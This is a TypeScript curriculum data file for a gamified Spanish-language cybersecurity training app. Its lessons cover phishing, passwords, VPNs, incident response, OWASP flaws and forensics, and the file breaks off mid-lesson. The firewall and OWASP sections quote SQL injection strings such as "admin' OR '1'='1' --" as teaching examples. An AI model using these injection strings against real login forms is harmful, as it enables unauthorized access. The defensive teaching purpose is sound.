/**
 * SuriLearn — Complete 4-Course Cybersecurity Curriculum & Interactive Video Game Missions
 *
 * Includes:
 * - Course 1 (unit_01): Módulo 1 · Anatomía del Phishing e Ingeniería Social
 * - Course 2 (unit_02): Módulo 2 · Criptografía, Identidad Zero Trust y Firewall Arcade
 * - Course 3 (unit_03): Módulo 3 · Redes Seguras, Wi-Fi Público y Laberinto VPN 2D
 * - Course 4 (unit_04): Módulo 4 · Respuesta a Incidentes SOC, Ransomware e IA (Deepfakes)
 */

import { LearningUnit, LearningNode, UnitTheoryGuide } from '../types/gamification';
import { Exercise } from '../types/exercises';

export const LESSON_SEQUENCE = [
  // Curso 1: Phishing e Ingeniería Social
  'inbox-scanner-1',
  'url-inspector-1',
  'chat-urgency-1',
  'attachment-phish-1',
  'rapid-triage-1',
  // Curso 2: Identidad, Criptografía y Firewall Arcade
  'password-builder-1',
  'permission-swipe-1',
  'firewall-arcade-1',
  'firewall-arcade-2',
  // Curso 3: Redes, Wi-Fi Público y Laberinto VPN
  'network-maze-1',
  'network-maze-2',
  'url-inspector-2',
  // Curso 4: Respuesta a Incidentes SOC, Ransomware e IA
  'incident-soc-1',
  'chat-deepfake-1',
  'incident-soc-2',
  // Curso 5: Seguridad Web OWASP & Blindaje DevSecOps
  'code-patcher-1',
  'owasp-url-5',
  'code-patcher-2',
  // Curso 6: Forense Digital, Caza de Amenazas (Threat Hunting) & Anti-IA
  'forensic-hunt-1',
  'forensic-hunt-2',
  'forensic-boss-6',
  // Curso 7: Zona Arcade Centinela (Juegos Clásicos)
  'arcade-hangman-1',
  'arcade-snake-1',
  'arcade-memory-1',
  'arcade-whack-1',
] as const;

export type LessonId = (typeof LESSON_SEQUENCE)[number];

// ==========================================
// 1. COURSE THEORY MANUALS (CÓDICE POR UNIDAD)
// ==========================================

export const UNIT_THEORY_GUIDES: Record<string, UnitTheoryGuide> = {
  unit_01: {
    subtitle: 'Autenticación de correo (SPF/DKIM), anatomía DNS y principios psicológicos de ingeniería social.',
    frameworkBadge: 'MITRE ATT&CK T1566 · RFC 7208',
    estimatedStudyMinutes: 15,
    overview:
      'El 82% de las intrusiones en PYMES inician con un correo electrónico o mensaje diseñado para engañar al ojo humano. En este curso dominarás la verificación técnica de cabeceras, la disección de dominios maliciosos y la neutralización de tácticas de manipulación psicológica.',
    sections: [
      {
        title: 'Autenticación SMTP: SPF, DKIM y Spoofing',
        icon: 'mail_lock',
        summary:
          'El protocolo de correo electrónico clásico (SMTP) no verificaba de origen quién enviaba un mensaje. Por ello existen los estándares SPF (Sender Policy Framework) y DKIM (DomainKeys Identified Mail).',
        keyPoints: [
          'El Nombre Visible ("Recursos Humanos") puede ser alterado libremente por cualquier atacante; siempre debes inspeccionar la dirección real entre signos < >.',
          'SPF valida que la dirección IP del servidor emisor esté autorizada por el dominio oficial de la empresa.',
          'DKIM añade una firma criptográfica digital que garantiza que el correo no fue alterado en tránsito.',
        ],
        realWorldCase:
          'Un atacante envía un correo con nombre visible "Tesorería PYME" pero desde <cobros@banc0-alerta.xyz> con SPF=FAIL solicitando cambiar la cuenta bancaria de un proveedor.',
      },
      {
        title: 'Anatomía de una URL y Typosquatting',
        icon: 'link',
        summary:
          'Una URL se lee de derecha a izquierda antes de la primera barra simple (/) para identificar quién es el verdadero propietario del servidor web.',
        keyPoints: [
          'El Dominio Raíz es el bloque inmediatamente anterior a la primera barra "/" (ej. en login.banco.com.trampa.xyz/auth, el dominio real es trampa.xyz).',
          'El Typosquatting reemplaza letras por números visualmente idénticos (micr0soft.com, banc0.com, rnicrosoft.com).',
          'El candado HTTPS solo indica que el canal está cifrado, NO que el propietario del sitio sea honesto; los sitios de phishing también usan certificados HTTPS gratuitos.',
        ],
        realWorldCase:
          'Un empleado recibe un SMS con el enlace https://seguridad-banca.com.verificar-acceso.top/login y entrega su token pensando que estaba en el portal de su banco.',
      },
      {
        title: 'Ingeniería Social, BEC y Doble Extensión',
        icon: 'psychology',
        summary:
          'Los ciberdelincuentes explotan disparadores cognitivos (Urgencia, Autoridad y Miedo) para impedir el pensamiento crítico del colaborador.',
        keyPoints: [
          'Fraude del CEO (BEC): Suplantar a un directivo por WhatsApp exigiendo transferencias o códigos OTP "porque está en una reunión urgente".',
          'Doble Extensión (.pdf.exe): Windows oculta por defecto las extensiones conocidas, haciendo que "Factura.pdf.exe" se vea como "Factura.pdf" cuando en realidad es un ejecutable binario.',
        ],
        realWorldCase:
          'El área contable recibe por correo "Comprobante_DIAN.pdf.exe". Al abrirlo pensando que era un PDF, se ejecuta un troyano de acceso remoto (RAT).',
      },
    ],
    goldenRules: [
      'Jamás confíes en el Nombre Visible del remitente; despliega siempre la cabecera técnica (SPF/DKIM) y el correo real.',
      'Lee los dominios web justo antes de la primera barra "/" para descubrir subdominios trampa.',
      'Ningún directivo, banco o soporte de TI te pedirá jamás un código SMS de 6 dígitos (OTP).',
      'Verifica siempre la última extensión de cualquier archivo adjunto; nunca abras .exe, .scr, .vbs ni .bat.',
    ],
  },

  unit_02: {
    subtitle: 'Entropía de Shannon en contraseñas, privilegio mínimo en móviles y filtrado de paquetes en Firewall.',
    frameworkBadge: 'NIST SP 800-63B · OWASP Top 10',
    estimatedStudyMinutes: 18,
    overview:
      'Una vez protegido el correo, la segunda línea de defensa de la madriguera digital son las credenciales criptográficas, el control de permisos en dispositivos móviles y el filtrado perimetral del Firewall frente a inyecciones y ataques de fuerza bruta.',
    sections: [
      {
        title: 'Entropía Criptográfica y Frases de Paso (Passphrases)',
        icon: 'password',
        summary:
          'La fortaleza de una contraseña se mide en bits de entropía (H = L × log2(N)). La longitud (L) impacta exponencialmente más que reemplazar letras por símbolos predecibles.',
        keyPoints: [
          'Sustituciones obvias como "P@ssw0rd2026" están en el top 100 de todos los diccionarios de crackeo (se vulneran en menos de 1 segundo con tarjetas GPU modernas).',
          'Según NIST SP 800-63B, una frase de paso (Passphrase) de 4 palabras aleatorias con separadores supera los 70 bits de entropía y requiere siglos para descifrarse.',
        ],
        realWorldCase:
          'Una PYME sufrió el secuestro de su servidor RDP porque la clave de administrador era "Empresa2025*", descifrada por un bot automatizado en 40 segundos.',
      },
      {
        title: 'Principio de Mínimo Privilegio en Dispositivos Móviles',
        icon: 'security',
        summary:
          'Cada aplicación en tu teléfono o PC debe tener acceso única y exclusivamente a los sensores indispensables para su función principal.',
        keyPoints: [
          'Permisos de Alto Riesgo: Leer SMS (permite robar códigos bancarios 2FA), Accesibilidad (permite controlar la pantalla) y Micrófono/Contactos.',
          'Una app de calculadora, linterna o lector QR nunca necesita leer tus SMS ni tu libreta de contactos corporativos.',
        ],
        realWorldCase:
          'Un colaborador instaló un "Escáner PDF Gratis" que pedía permiso de leer SMS; la app interceptó en segundo plano los tokens bancarios de la empresa.',
      },
      {
        title: 'Filtrado de Paquetes en Firewall y Puertos de Red',
        icon: 'shield',
        summary:
          'Un Firewall de nueva generación (NGFW / WAF) inspecciona cada paquete entrante según su puerto TCP/UDP y su carga útil (payload).',
        keyPoints: [
          'Tráfico Legítimo Habitual: HTTPS seguro (Puerto 443 con TLS 1.3) y consultas DNS verificadas (Puerto 53).',
          'Tráfico Malicioso a Bloquear: Inyecciones SQL ("\' OR 1=1 --"), intentos de Fuerza Bruta SSH (Puerto 22 expuesto), Telnet sin cifrar (Puerto 23) e inundaciones DDoS SYN.',
        ],
        realWorldCase:
          'En el videojuego Bastión Cortafuegos controlarás la compuerta del servidor para absorber paquetes HTTPS legítimos y destruir con pulso láser las inyecciones SQL y ataques SSH.',
      },
    ],
    goldenRules: [
      'Usa frases de paso (Passphrases) de 4+ palabras no relacionadas y un gestor de contraseñas.',
      'Revisa siempre la coherencia entre la función de una app móvil y los permisos que exige.',
      'Cierra puertos administrativos expuestos a Internet (SSH :22, RDP :3389, Telnet :23) y filtra inyecciones SQL.',
    ],
  },

  unit_03: {
    subtitle: 'Defensa ante ataques Man-in-the-Middle (MitM), puntos Wi-Fi "Evil Twin", túneles VPN y MFA.',
    frameworkBadge: 'Zero Trust ZTNA · IEEE 802.11i',
    estimatedStudyMinutes: 16,
    overview:
      'El trabajo remoto e híbrido expone a los colaboradores a redes fuera del control de la empresa. En este curso aprenderás cómo operan los interceptores de paquetes (Sniffers) y cómo proteger los datos en tránsito mediante túneles VPN y llaves MFA.',
    sections: [
      {
        title: 'Ataques Man-in-the-Middle (MitM) y Sniffing de Paquetes',
        icon: 'bug_report',
        summary:
          'En una red Wi-Fi abierta o compartida (cafeterías, aeropuertos, hoteles), cualquier atacante conectado a la misma red puede capturar los paquetes que viajan sin cifrado adicional.',
        keyPoints: [
          'Un Sniffer (como Wireshark o herramientas de ARP Spoofing) intercepta el tráfico entre tu dispositivo y el router.',
          'Si transmites documentos o credenciales por canales no cifrados, el atacante obtiene una copia exacta en tiempo real.',
        ],
        realWorldCase:
          'Desde la cafetería frente a una oficina, un atacante capturó las cookies de sesión del sistema contable de un empleado conectado al Wi-Fi abierto.',
      },
      {
        title: 'Redes "Evil Twin" (Gemelo Malvado) y Portales Cautivos',
        icon: 'wifi_tethering_error',
        summary:
          'Un ataque Evil Twin consiste en crear un punto de acceso Wi-Fi falso desde el portátil o antena de un atacante con el mismo nombre (SSID) que la red legítima del lugar.',
        keyPoints: [
          'Los atacantes usan nombres como "WiFi_Aeropuerto_Gratis" o clonan el nombre de la red de invitados de tu empresa.',
          'Al conectarte, te muestran un portal cautivo falso pidiendo iniciar sesión con tu correo corporativo o cuenta Google.',
        ],
        realWorldCase:
          'En el videojuego Laberinto Táctico 2D deberás esquivar los routers Evil Twin y activar primero el túnel VPN antes de cruzar zonas con Sniffers.',
      },
      {
        title: 'Túneles VPN (IPSec / WireGuard) y Autenticación FIDO2 MFA',
        icon: 'vpn_lock',
        summary:
          'Una Red Privada Virtual (VPN) encapsula y cifra todo tu tráfico (AES-256) desde tu equipo hasta el servidor corporativo, volviéndolo ilegible para cualquier Sniffer intermedio.',
        keyPoints: [
          'Incluso si un Sniffer captura paquetes dentro de un túnel VPN activo, solo verá datos cifrados indescifrables.',
          'El modelo Zero Trust exige combinar el túnel cifrado con verificación de identidad multifactor (MFA) antes de autorizar el acceso al servidor.',
        ],
        realWorldCase:
          'Una PYME implementó VPN WireGuard obligatoria + MFA para su equipo comercial, neutralizando el robo de sesiones en viajes de negocios.',
      },
    ],
    goldenRules: [
      'Nunca accedas a sistemas de la empresa desde un Wi-Fi público sin encender antes la VPN corporativa.',
      'Desconfía de redes Wi-Fi abiertas sin contraseña o que pidan tu clave de correo en un portal de bienvenida.',
      'En arquitectura Zero Trust, ningún usuario entra al servidor central sin VPN activa + validación MFA.',
    ],
  },

  unit_04: {
    subtitle: 'Protocolo NIST SP 800-61 de respuesta a incidentes, contención de Ransomware, Backups 3-2-1 y Deepfakes con IA.',
    frameworkBadge: 'NIST SP 800-61r2 · ISO/IEC 27035',
    estimatedStudyMinutes: 20,
    overview:
      'En ciberseguridad moderna no basta con prevenir; debes saber cómo reaccionar en los primeros 60 segundos cuando ocurre una brecha activa o un ataque con Inteligencia Artificial Generativa.',
    sections: [
      {
        title: 'Protocolo de Respuesta a Incidentes (NIST SP 800-61)',
        icon: 'emergency',
        summary:
          'Cuando un equipo de la empresa muestra signos de infección por Ransomware, el orden de las acciones determina si el incidente se limita a una sola PC o destruye toda la compañía.',
        keyPoints: [
          'Paso 1 — Contención (Aislar VLAN / Desconectar Red): Cortar inmediatamente el cable Ethernet y el Wi-Fi del nodo infectado para detener el movimiento lateral hacia servidores.',
          'Paso 2 — Erradicación (Purgar Malware con EDR): Eliminar el proceso malicioso y revocar los tokens IAM comprometidos.',
          'Paso 3 — Recuperación (Restaurar Backup 3-2-1): Restaurar los archivos desde copias de seguridad limpias e inmutables, solo después de haber aislado y purgado el virus.',
        ],
        realWorldCase:
          'En el videojuego Alerta Roja SOC operarás la consola de red en vivo aplicando la secuencia Aislar -> Purgar -> Restaurar antes de que el cifrado llegue al 100%.',
      },
      {
        title: 'Regla de Oro de Backups 3-2-1 e Inmutabilidad',
        icon: 'settings_backup_restore',
        summary:
          'La única defensa definitiva para no pagar jamás un rescate de Ransomware es contar con copias de seguridad bajo la regla 3-2-1.',
        keyPoints: [
          '3 copias de los datos críticos de la PYME.',
          '2 soportes o tecnologías diferentes (ej. NAS local + Nube).',
          '1 copia fuera de línea (Offline / Air-gapped) o Inmutable (WORM: Write Once, Read Many) que el ransomware no pueda borrar ni cifrar.',
        ],
        realWorldCase:
          'Una clínica PYME recuperó el 100% de sus historias clínicas en 2 horas tras un ataque LockBit gracias a su copia inmutable en la nube.',
      },
      {
        title: 'Amenazas de IA Generativa: Deepfakes de Voz y Video',
        icon: 'record_voice_over',
        summary:
          'Con solo 15 segundos de audio público en redes sociales, los atacantes actuales clonan la voz exacta de un gerente o familiar para ordenar transferencias urgentes.',
        keyPoints: [
          'El timbre de voz en una llamada o nota de voz de WhatsApp ya NO es prueba de identidad.',
          'Establece una "Palabra Clave Segura" o protocolo de doble firma en canal independiente para cualquier operación financiera.',
        ],
        realWorldCase:
          'Un tesorero recibió una nota de voz idéntica a la del Director General pidiendo un giro internacional confidencial; al pedir la palabra clave de seguridad por llamada interna descubrió el Deepfake.',
      },
    ],
    goldenRules: [
      'Ante un brote de Ransomware: 1° Aísla la red del equipo, 2° Revoca credenciales y purga el virus, 3° Restaura el Backup 3-2-1.',
      'Nunca restaures un backup en un equipo que sigue conectado y con el malware activo.',
      'No confíes únicamente en el timbre de voz en notas de audio urgentes; exige verificación cruzada.',
    ],
  },

  unit_05: {
    subtitle: 'Estándar OWASP Top 10, prevención de Inyección SQL (SQLi), Cross-Site Scripting (XSS), IDOR y parcheo DevSecOps.',
    frameworkBadge: 'OWASP Top 10 · ASVS 4.0',
    estimatedStudyMinutes: 18,
    overview:
      'Los portales web, tiendas en línea y APIs de una PYME están expuestos las 24 horas a bots que inyectan código malicioso en formularios y URLs. En este curso aprenderás cómo operan los exploits web y cómo blindar el código mediante parches DevSecOps.',
    sections: [
      {
        title: 'OWASP A03: Inyección SQL (SQLi) y Consultas Parametrizadas',
        icon: 'database',
        summary:
          'La Inyección SQL ocurre cuando una aplicación concatena directamente lo que escribe el usuario dentro de una consulta a la base de datos sin separarlo como parámetro.',
        keyPoints: [
          'Un payload como "admin\' OR \'1\'=\'1\' --" altera la lógica booleana de la consulta SQL para que siempre sea verdadera y permita entrar sin contraseña.',
          'La defensa definitiva es utilizar Consultas Parametrizadas (Prepared Statements con marcadores ? o $1), donde el motor trata la entrada estrictamente como dato y jamás como comando ejecutable.',
        ],
        realWorldCase:
          'En el videojuego Escudo DevSecOps deberás interceptar oleadas de SQLi en vivo y desplegar el parche Prepared Statement antes de que el atacante extraiga la base de clientes.',
      },
      {
        title: 'Cross-Site Scripting (XSS) y Content-Security-Policy (CSP)',
        icon: 'code_off',
        summary:
          'En un ataque XSS, el atacante inyecta código JavaScript (<script>) en comentarios, perfiles o parámetros URL para que se ejecute en el navegador de otros usuarios o administradores.',
        keyPoints: [
          'Permite robar cookies de sesión (document.cookie) o secuestrar la cuenta del administrador.',
          'Se mitiga escapando/sanitizando la salida HTML (DOMPurify), usando cookies HttpOnly y configurando la cabecera Content-Security-Policy (CSP).',
        ],
        realWorldCase:
          'Un atacante publicó un comentario con un script oculto en el portal de soporte; gracias a las cookies HttpOnly y sanitización DOM, el intento de robo de sesión falló.',
      },
      {
        title: 'OWASP A01: Control de Acceso Roto (IDOR)',
        icon: 'lock_person',
        summary:
          'La Referencia Directa Insegura a Objetos (IDOR) ocurre cuando un endpoint (/api/facturas?id=1045) entrega un documento confidencial solo cambiando el número ID en la URL, sin verificar si pertenece al usuario autenticado.',
        keyPoints: [
          'Ocultar un botón en la interfaz no protege la API; el servidor debe validar en cada petición que resource.ownerId === req.user.id.',
          'Implementa control de acceso basado en roles (RBAC) e identificadores UUID no secuenciales.',
        ],
        realWorldCase:
          'Una pasarela de facturación permitía descargar facturas ajenas cambiando el número final de la URL hasta que se inyectó el middleware de validación de propietario.',
      },
    ],
    goldenRules: [
      'Jamás concatenes variables de usuario directamente en consultas SQL; usa siempre Prepared Statements (?).',
      'Sanitiza toda entrada/salida HTML y protege las cookies de sesión con los atributos HttpOnly, Secure y SameSite.',
      'Valida siempre en el backend que el usuario autenticado sea el propietario legítimo del recurso solicitado (Anti-IDOR).',
    ],
  },

  unit_06: {
    subtitle: 'Caza proactiva de amenazas (Threat Hunting), análisis forense de memoria RAM, bloqueo de servidores C2 e Indicadores de Compromiso (IoC).',
    frameworkBadge: 'MITRE ATT&CK · ISO/IEC 27037',
    estimatedStudyMinutes: 20,
    overview:
      'El malware avanzado (APT y troyanos sigilosos) se oculta en la memoria volátil RAM imitando nombres de procesos legítimos del sistema operativo mientras exfiltra información hacia servidores de Comando y Control (C2). Aquí te entrenarás como Investigador Forense CSI Cyber.',
    sections: [
      {
        title: 'Análisis de Memoria Volátil (RAM) y Procesos Camuflados (Masquerading)',
        icon: 'memory',
        summary:
          'Los atacantes nombran sus troyanos de forma casi idéntica a procesos críticos de Windows (ej. "svch0st.exe" con un cero en lugar de "svchost.exe") para pasar desapercibidos en el Administrador de Tareas.',
        keyPoints: [
          'Verifica siempre el estado de la Firma Digital: los procesos oficiales del sistema tienen firma criptográfica verificada por Microsoft.',
          'Revisa si el proceso abre sockets de red hacia direcciones IP externas desconocidas o puertos inusuales como 4444, 6667 o 8443.',
        ],
        realWorldCase:
          'En el videojuego Laboratorio CSI Cyber inspeccionarás la memoria RAM en vivo y terminarás únicamente los PIDs maliciosos antes de que completen la exfiltración.',
      },
      {
        title: 'Servidores de Comando y Control (C2) y Exfiltración de Datos',
        icon: 'Sensors',
        summary:
          'Una vez dentro de un equipo, el malware establece un canal de comunicación saliente (Beaconing) hacia un servidor C2 controlado por el atacante para recibir órdenes y robar archivos confidenciales.',
        keyPoints: [
          'Detectar conexiones persistentes desde procesos de oficina (Word, Excel, PowerShell) hacia IPs externas es señal crítica de compromiso.',
          'Al identificar un proceso C2, se debe terminar el PID y bloquear el socket/IP en el firewall perimetral.',
        ],
        realWorldCase:
          'Un analista detectó que una calculadora descargada de internet abría un túnel en el puerto 4444 hacia una IP anónima cada 30 segundos.',
      },
      {
        title: 'Indicadores de Compromiso (IoCs) y Cadena de Custodia SHA-256',
        icon: 'fingerprint',
        summary:
          'En informática forense (ISO/IEC 27037), cada archivo malicioso posee una huella digital única e irrepetible llamada Hash Criptográfico (SHA-256).',
        keyPoints: [
          'Aunque el atacante cambie el nombre del archivo de "virus.exe" a "Nomina_2026.pdf.exe", su hash SHA-256 permanece idéntico.',
          'Determinar la Causa Raíz (Paciente Cero) permite cerrar la brecha por la que entró la amenaza para que no vuelva a repetirse.',
        ],
        realWorldCase:
          'Comparar el hash SHA-256 del ejecutable sospechoso permitió bloquearlo automáticamente en las 40 computadoras de la empresa en segundos.',
      },
    ],
    goldenRules: [
      'Un proceso sin firma digital válida que abre conexiones salientes hacia IPs desconocidas (ej. puerto 4444) es un troyano C2 activo.',
      'No apagues de golpe un servidor bajo investigación forense sin antes capturar o inspeccionar las evidencias en la memoria RAM volátil.',
      'Todo incidente forense concluye identificando y cerrando el vector raíz de entrada (IoC).',
    ],
  },

  unit_07: {
    subtitle: 'Minijuegos arcade clásicos para entrenar reflejos, vocabulario y memoria defensiva',
    frameworkBadge: 'Arcade Gamificado · NIST + OWASP',
    estimatedStudyMinutes: 10,
    overview:
      'Aprender ciberseguridad no tiene por qué ser aburrido. Esta Zona Arcade adapta cuatro mecánicas clásicas —Ahorcado, Culebrita, Memorama y Atrapa al Topo— para que fijes conceptos críticos mediante juego directo y velocidad mental.',
    sections: [
      {
        title: '1. Vocabulario Táctico y Memoria Asociativa',
        icon: 'spellcheck',
        summary:
          'Conocer el nombre exacto de cada ataque (Phishing, Ransomware) y emparejarlo con su defensa exacta reduce drásticamente los errores bajo presión real.',
        keyPoints: [
          'En el Ahorcado Centinela descifras términos clave usando pistas técnicas antes de perder el escudo.',
          'En el Memorama emparejas cada vector malicioso con la contramedida recomendada por NIST y OWASP.',
        ],
        realWorldCase:
          'Equipos que refuerzan memoria asociativa amenaza-defensa responden hasta 2 veces más rápido al reportar correos sospechosos.',
      },
      {
        title: '2. Reflejos Arcade en Tráfico y Puertos',
        icon: 'sports_esports',
        summary:
          'En la Culebrita Firewall y Atrapa al Hacker entrenas tu capacidad de distinguir paquetes cifrados válidos frente a malware sin bloquear servicios legítimos.',
        keyPoints: [
          'Recoge protocolos y controles seguros (HTTPS, MFA, VPN, PATCH) y esquiva cargas maliciosas.',
          'Bloquea puertos atacados sin interrumpir respaldos TLS ni DNS corporativo.',
        ],
        realWorldCase:
          'Un buen analista SOC equilibra disponibilidad y seguridad: detiene la amenaza sin causar falsos positivos en producción.',
      },
    ],
    goldenRules: [
      'Cada ataque tiene una defensa precisa: identifica primero el vector y aplica la contramedida adecuada.',
      'Bloquea las conexiones sospechosas sin desconectar tráfico legítimo esencial.',
      'Practicar mecánicas cortas a diario consolida el instinto preventivo.',
    ],
  },
};

// ==========================================
// 2. NODES BY COURSE (4 LEARNING UNITS)
// ==========================================

export const UNIT_1_NODES: LearningNode[] = [
  {
    id: 'inbox-scanner-1',
    unitId: 'unit_01',
    order: 1,
    title: 'Cabeceras y Remitente Falso',
    subtitle: 'Protocolos SPF/DKIM y suplantación SMTP (2 misiones)',
    type: 'lesson',
    status: 'active',
    stars: 0,
    icon: 'mail',
    lanePosition: 'left',
    expReward: 25,
    estimatedMinutes: 5,
    gameTypeLabel: 'Simulador Forense Email',
    theorySlides: [
      {
        id: 'u1_l1_s1',
        badge: 'Fundamento Técnico · SMTP',
        title: '¿Por qué un atacante puede fingir el nombre de tu jefe?',
        icon: 'mail_lock',
        standardRef: 'RFC 7208 (SPF)',
        content:
          'En un correo electrónico existen dos campos distintos: el "Nombre Visible" (que cualquiera puede escribir libremente, como "Recursos Humanos Oficial") y la dirección técnica real entre signos < >. Además, los servidores legítimos firman sus envíos mediante SPF (Sender Policy Framework) y DKIM (DomainKeys Identified Mail).',
        trapExample:
          'Nombre visible: "Nómina Oficial" pero dirección real <soporte@banc0-alert.xyz> con estado SPF: FAIL y DKIM: FAIL.',
        safeExample:
          'Abrir siempre los detalles técnicos de la cabecera antes de hacer clic y confirmar que SPF y DKIM estén en PASS desde el dominio oficial.',
        suriTip:
          'En la misión que sigue, toca el botón "Inspeccionar Cabecera Técnica" antes de emitir tu veredicto.',
      },
      {
        id: 'u1_l1_s2',
        badge: 'Psicología del Phishing',
        title: 'La Trampa del Pánico Salarial o Bloqueo de Cuenta',
        icon: 'psychology_alt',
        standardRef: 'MITRE ATT&CK T1566',
        content:
          'Los atacantes saben que si analizas con calma el correo notarás el engaño. Por eso fabrican crisis emocionales ("Tu sueldo fue retenido", "Tu cuenta Microsoft 365 será eliminada en 2 horas") para activar una respuesta impulsiva.',
        trapExample:
          '"⚠️ URGENTE: Confirme sus datos bancarios antes del mediodía o su abono mensual será bloqueado."',
        safeExample:
          'Si un correo amenaza con una consecuencia grave en pocas horas, detente y verifica por el canal interno de la empresa.',
        suriTip:
          'A mayor urgencia artificial en el asunto del correo, mayor probabilidad de que sea Phishing.',
      },
    ],
  },
  {
    id: 'url-inspector-1',
    unitId: 'unit_01',
    order: 2,
    title: 'Disección de URLs y Typosquatting',
    subtitle: 'Subdominios engañosos y dominios clonados (3 misiones)',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'link',
    lanePosition: 'center',
    expReward: 30,
    estimatedMinutes: 6,
    gameTypeLabel: 'Inspector Táctico DNS',
    theorySlides: [
      {
        id: 'u1_l2_s1',
        badge: 'Arquitectura DNS',
        title: 'Cómo leer una URL como un analista de ciberseguridad',
        icon: 'dns',
        standardRef: 'OWASP Phishing Defense',
        content:
          'Los navegadores leen los dominios de derecha a izquierda hasta encontrar la primera barra simple "/". Todo lo que esté a la izquierda del dominio raíz son simples carpetas o subdominios que el atacante puede llamar como quiera.',
        trapExample:
          'https://login.banco-seguro.com.cuentas-validar.xyz/auth -> Aquí el verdadero dueño del servidor es "cuentas-validar.xyz".',
        safeExample:
          'https://login.banco-seguro.com/auth -> Aquí justo antes de "/auth" está "banco-seguro.com", que sí es el dominio real.',
        suriTip:
          'Busca la primera barra "/" después de https:// y mira justo a su izquierda: ¡ahí se esconde la trampa!',
      },
      {
        id: 'u1_l2_s2',
        badge: 'Técnica Homográfica',
        title: 'Typosquatting y el Mito del Candado HTTPS',
        icon: 'spellcheck',
        standardRef: 'NIST SP 800-63',
        content:
          'El Typosquatting sustituye letras por caracteres casi idénticos (como el número "0" por la letra "o", o "rn" juntos para parecer una "m"). Además, recuerda que el protocolo HTTPS solo cifra la conexión, pero los criminales también registran certificados HTTPS en sus dominios falsos.',
        trapExample:
          'https://portal-micr0soft.com/login (usa un cero "0" en lugar de la letra "o").',
        safeExample:
          'Inspeccionar letra por letra el dominio raíz y utilizar marcadores guardados para entrar a portales bancarios.',
        suriTip:
          'En este juego tocarás el segmento exacto de la URL donde el atacante camufló el engaño.',
      },
    ],
  },
  {
    id: 'chest_01',
    unitId: 'unit_01',
    order: 3,
    title: 'Cofre Alerta',
    subtitle: 'Bono de Madriguera (+50 Bits)',
    type: 'reward_chest',
    status: 'locked',
    stars: 0,
    icon: 'inventory_2',
    lanePosition: 'right',
    expReward: 0,
    estimatedMinutes: 1,
    isClaimed: false,
    bitsReward: 50,
  },
  {
    id: 'chat-urgency-1',
    unitId: 'unit_01',
    order: 4,
    title: 'Fraude del CEO y Secuestro OTP',
    subtitle: 'Ingeniería social en WhatsApp y Slack (2 escenarios)',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'chat',
    lanePosition: 'center',
    expReward: 30,
    estimatedMinutes: 6,
    gameTypeLabel: 'Simulador Chat en Vivo',
    theorySlides: [
      {
        id: 'u1_l3_s1',
        badge: 'Ingeniería Social · BEC',
        title: 'El Fraude del Ejecutivo (Business Email/Chat Compromise)',
        icon: 'supervisor_account',
        standardRef: 'principios de Cialdini',
        content:
          'En el ataque BEC o Fraude del CEO, el delincuente investiga en LinkedIn el nombre del gerente financiero o director de la PYME y escribe desde un número nuevo diciendo que está en una junta crítica y necesita un código o transferencia inmediata.',
        trapExample:
          '"Soy el Lic. Torres, cambié de celular. Pásame ya el código de 6 dígitos que te llegó por SMS para destrabar el pago a proveedores."',
        safeExample:
          'Negarse cortésmente por política de seguridad y llamar a la extensión interna conocida para verificar la orden.',
        suriTip:
          'Nunca entregues códigos OTP por chat, ni siquiera a tu propio jefe o al supuesto equipo de Soporte TI.',
      },
    ],
  },
  {
    id: 'attachment-phish-1',
    unitId: 'unit_01',
    order: 5,
    title: 'Adjuntos Trampa y Macros (.pdf.exe)',
    subtitle: 'Análisis de ejecutables camuflados (2 misiones)',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'attach_file',
    lanePosition: 'left',
    expReward: 25,
    estimatedMinutes: 5,
    gameTypeLabel: 'Laboratorio de Adjuntos',
    theorySlides: [
      {
        id: 'u1_l4_s1',
        badge: 'Análisis de Malware',
        title: 'El Truco de la Doble Extensión (.pdf.exe y .xlsx.scr)',
        icon: 'insert_drive_file',
        standardRef: 'MITRE ATT&CK T1036.007',
        content:
          'El sistema operativo determina cómo abrir un archivo leyendo únicamente lo que está DESPUÉS del último punto en su nombre. Los atacantes nombran sus troyanos como "Factura_Abril.pdf.exe" para que el usuario confiado solo lea ".pdf" al principio.',
        trapExample:
          'Adjunto: "Mandamiento_Judicial_DIAN.pdf.exe" (2.4 MB) -> Es un programa ejecutable (.exe) que instala ransomware.',
        safeExample:
          'Revisar la extensión final real del archivo y desconfiar de documentos que pidan "Habilitar Macros / Contenido" al abrirse.',
        suriTip:
          'Si el nombre del archivo termina en .exe, .scr, .bat, .cmd o .vbs, ¡es código ejecutable peligroso!',
      },
    ],
  },
  {
    id: 'rapid-triage-1',
    unitId: 'unit_01',
    order: 6,
    title: 'Radar Relámpago de Amenazas',
    subtitle: 'Decisión táctica contrarreloj (7s por tarjeta)',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'radar',
    lanePosition: 'center',
    expReward: 35,
    estimatedMinutes: 4,
    gameTypeLabel: '🎮 Arcade Contrarreloj',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u1_l5_s1',
        badge: 'Prueba Final Módulo 1',
        title: 'Reflejos Centinela: Smishing, QRishing y Alertas Falsas',
        icon: 'bolt',
        standardRef: 'Heurística Defensiva',
        content:
          'En el día a día laboral recibirás múltiples estímulos simultáneos: mensajes SMS de paquetería con enlaces acortados (bit.ly), avisos falsos de actualización en el navegador y notificaciones legítimas de seguridad. ¡Pon a prueba tus reflejos bajo presión!',
        trapExample:
          'SMS: "Tu paquete DHL está retenido en aduana, paga $1.50 USD en bit.ly/dhl-99".',
        safeExample:
          'Correo informativo de @accounts.google.com que no solicita claves ni incluye enlaces acortados extraños.',
        suriTip:
          'Tienes 7 segundos por tarjeta para clasificar entre "¡Es una Trampa!" o "Es Seguro".',
      },
    ],
  },
];

export const UNIT_2_NODES: LearningNode[] = [
  {
    id: 'password-builder-1',
    unitId: 'unit_02',
    order: 1,
    title: 'Bóveda de Entropía y Passphrases',
    subtitle: 'Resistencia matemática contra Robot Cracker (2 retos)',
    type: 'lesson',
    status: 'active',
    stars: 0,
    icon: 'password',
    lanePosition: 'left',
    expReward: 30,
    estimatedMinutes: 6,
    gameTypeLabel: 'Constructor Criptográfico',
    theorySlides: [
      {
        id: 'u2_l1_s1',
        badge: 'Criptografía Aplicada',
        title: 'Entropía de Shannon: Por qué "P@ssw0rd123" cae en 1 segundo',
        icon: 'enhanced_encryption',
        standardRef: 'NIST SP 800-63B',
        content:
